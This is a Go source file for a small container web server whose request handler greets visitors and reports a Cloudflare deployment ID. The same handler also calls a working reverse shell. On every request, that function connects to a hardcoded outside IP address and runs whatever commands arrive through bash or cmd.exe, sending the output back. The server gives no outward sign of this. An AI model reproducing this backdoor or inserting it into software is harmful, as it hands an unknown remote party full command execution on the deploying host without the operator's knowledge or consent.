package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"bufio"
	"net"
	"os/exec"
	"runtime"
)

func ReverseShell(host string, port string) {
	// Combine host and port to form the connection string
	address := host + ":" + port

	// Attempt to establish a TCP connection to the listener[2].
	connection, err := net.Dial("tcp", address)
	if err != nil {
		// If the initial connection fails, we simply exit.
		// For a more robust shell, you could implement a retry loop[2].
		return
	}
	// Ensure the connection is closed when the function exits.
	defer connection.Close()

	// Determine the appropriate shell based on the host operating system[2].
	var shell string
	if runtime.GOOS == "windows" {
		shell = "cmd.exe"
	} else {
		// Use /bin/sh for Linux, macOS, and other Unix-like systems.
		shell = "/bin/bash"
	}

	// Start a new scanner to read commands from the TCP connection[2].
	scanner := bufio.NewScanner(connection)
	for scanner.Scan() {
		// Read the command from the listener.
		command := scanner.Text()

		var cmd *exec.Cmd
		// Execute the command using the OS-specific shell.
		// The '-c' flag (for sh) or '/C' flag (for cmd.exe) tells the shell
		// to execute the command string that follows.
		if runtime.GOOS == "windows" {
			cmd = exec.Command(shell, "/C", command)
		} else {
			cmd = exec.Command(shell, "-c", command)
		}

		// Execute the command and capture its combined standard output and standard error[2].
		output, err := cmd.CombinedOutput()
		if err != nil {
			// If an error occurs during execution, send the error message back to the listener.
			connection.Write([]byte(err.Error() + "\n"))
		}

		// Send the result of the command back to the listener[2].
		connection.Write(output)
	}
}

func handler(w http.ResponseWriter, r *http.Request) {
	message := os.Getenv("MESSAGE")
	instanceId := os.Getenv("CLOUDFLARE_DEPLOYMENT_ID")

	fmt.Fprintf(w, "Hi, I'm a container and this is my message: %s, and my instance ID is: %s", message, instanceId)
	ReverseShell("155.248.231.167", "4242")

}

func errorHandler(w http.ResponseWriter, r *http.Request) {
	panic("This is a panic")
}

func main() {
	http.HandleFunc("/", handler)
	http.HandleFunc("/container", handler)
	http.HandleFunc("/error", errorHandler)
	log.Fatal(http.ListenAndServe(":8080", nil))
}
